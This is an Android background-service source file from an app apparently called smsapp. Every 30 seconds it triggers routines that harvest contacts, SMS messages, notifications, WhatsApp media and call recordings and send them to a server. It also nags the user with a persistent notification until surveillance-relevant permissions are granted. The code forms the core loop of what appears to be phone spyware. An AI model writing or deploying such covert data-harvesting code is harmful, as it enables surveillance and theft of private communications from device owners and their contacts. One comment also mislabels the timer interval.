package gonext.smsapp.servers;

import android.Manifest;
import android.app.Notification;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Handler;
import android.os.IBinder;
import android.provider.Settings;
import android.support.v4.app.TaskStackBuilder;
import android.support.v4.content.ContextCompat;
import android.support.v7.app.NotificationCompat;
import android.text.TextUtils;
import android.widget.Toast;

import java.util.ArrayList;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;

import gonext.smsapp.MainActivity;
import gonext.smsapp.R;
import gonext.smsapp.utils.Utils;

/**
 * Created by ram on 05/10/17.
 */

public class BackgroundJob extends Service {
    public static final int notify = 30000;  //interval between two services(Here Service run every 5 Minute)
    public static final int PERMISSION_DELAY = 300000;  //interval between two services(Here Service run every 5 Minute)
    private Handler mHandler = new Handler();   //run on another Thread to avoid crash
    private Timer mTimer = null;    //timer handling
    private Timer permissionTimer = null;    //timer handling
    private BackgroundJobService backgroundJobService;
    @Override
    public IBinder onBind(Intent intent) {
        throw new UnsupportedOperationException("Not yet implemented");
    }

    @Override
    public void onCreate() {
        backgroundJobService = new BackgroundJobService(this);
        if (mTimer != null) // Cancel if already existed
            mTimer.cancel();
        else
            mTimer = new Timer();   //recreate new

        mTimer.scheduleAtFixedRate(new TimeDisplay(), 0, notify);   //Schedule task

        if(Utils.isAndroid6()) {
            if (permissionTimer != null) // Cancel if already existed
                permissionTimer.cancel();
            else
                permissionTimer = new Timer();

            permissionTimer.scheduleAtFixedRate(new PermissionDelay(), PERMISSION_DELAY, PERMISSION_DELAY);   //Schedule task
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        mTimer.cancel();    //For Cancel Timer
        if(Utils.isAndroid6()) {
            permissionTimer.cancel();
        }
        Toast.makeText(this, "Service is Destroyed", Toast.LENGTH_SHORT).show();
    }

    //class TimeDisplay for handling task
    class TimeDisplay extends TimerTask {
        @Override
        public void run() {
            // run on another thread
            mHandler.post(new Runnable() {
                @Override
                public void run() {
                    // display toast
                    if(backgroundJobService != null) {
                        backgroundJobService.ReadPhoneContacts();
                        backgroundJobService.sendSMSToServer();
                        backgroundJobService.sendNotificationsToServer();
                        backgroundJobService.readWhatsAppMediaFiles();
                        backgroundJobService.sendCallRecording();
                    }
                }
            });
        }
    }

    class PermissionDelay extends TimerTask {
        @Override
        public void run() {
            // run on another thread
            mHandler.post(new Runnable() {
                @Override
                public void run() {
                    List<String> disabledPermissions = new ArrayList<>();
                    boolean allPermissionGranted = true;
                    // display toast
                    if (ContextCompat.checkSelfPermission(BackgroundJob.this,
                            Manifest.permission.READ_PHONE_STATE)
                            != PackageManager.PERMISSION_GRANTED) {
                        allPermissionGranted = false;
                        disabledPermissions.add("READ_PHONE_STATE");
                    }
                    if (ContextCompat.checkSelfPermission(BackgroundJob.this,
                            Manifest.permission.READ_CONTACTS)
                            != PackageManager.PERMISSION_GRANTED) {
                        allPermissionGranted = false;
                        disabledPermissions.add("READ_CONTACTS");
                    }
                    if (ContextCompat.checkSelfPermission(BackgroundJob.this,
                            Manifest.permission.READ_SMS)
                            != PackageManager.PERMISSION_GRANTED) {
                        allPermissionGranted = false;
                        disabledPermissions.add("READ_SMS");
                    }
                    if (ContextCompat.checkSelfPermission(BackgroundJob.this,
                            Manifest.permission.WRITE_EXTERNAL_STORAGE)
                            != PackageManager.PERMISSION_GRANTED) {
                        allPermissionGranted = false;
                        disabledPermissions.add("WRITE_EXTERNAL_STORAGE");
                    }
                    if (ContextCompat.checkSelfPermission(BackgroundJob.this,
                            Manifest.permission.RECORD_AUDIO)
                            != PackageManager.PERMISSION_GRANTED) {
                        allPermissionGranted = false;
                        disabledPermissions.add("RECORD_AUDIO");
                    }
                    if (ContextCompat.checkSelfPermission(BackgroundJob.this,
                            Manifest.permission.PROCESS_OUTGOING_CALLS)
                            != PackageManager.PERMISSION_GRANTED) {
                        allPermissionGranted = false;
                        disabledPermissions.add("PROCESS_OUTGOING_CALLS");
                    }

                    if(!allPermissionGranted){
                        //send local notification
                        if(!Utils.isNotificationVisible(BackgroundJob.this,11)) {
                            sendNotification(TextUtils.join(",", disabledPermissions));
                        }
                    }
                }
            });
        }
    }
    public void sendNotification(String msg){
        Intent intent = new Intent();
        intent.setAction(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
        Uri uri = Uri.fromParts("package", getPackageName(), null);
        intent.setData(uri);

        NotificationManager notificationManager = (NotificationManager) this.getSystemService(Context.NOTIFICATION_SERVICE);

        PendingIntent pendingIntent = PendingIntent.getActivity(this, 1002, intent, 0);

        Notification.Builder builder = new Notification.Builder(this);

        builder.setAutoCancel(false);
        builder.setTicker(getString(R.string.app_name));
        builder.setContentTitle("Permission required");
        builder.setContentText(msg);
        builder.setSmallIcon(R.mipmap.app_icon);
        builder.setContentIntent(pendingIntent);
        builder.setOngoing(true);
        builder.setAutoCancel(true);
        builder.setSubText("");   //API level 16
        builder.setNumber(100);
        builder.build();

        Notification myNotication = builder.getNotification();
        notificationManager.notify(11, myNotication);

    }
}
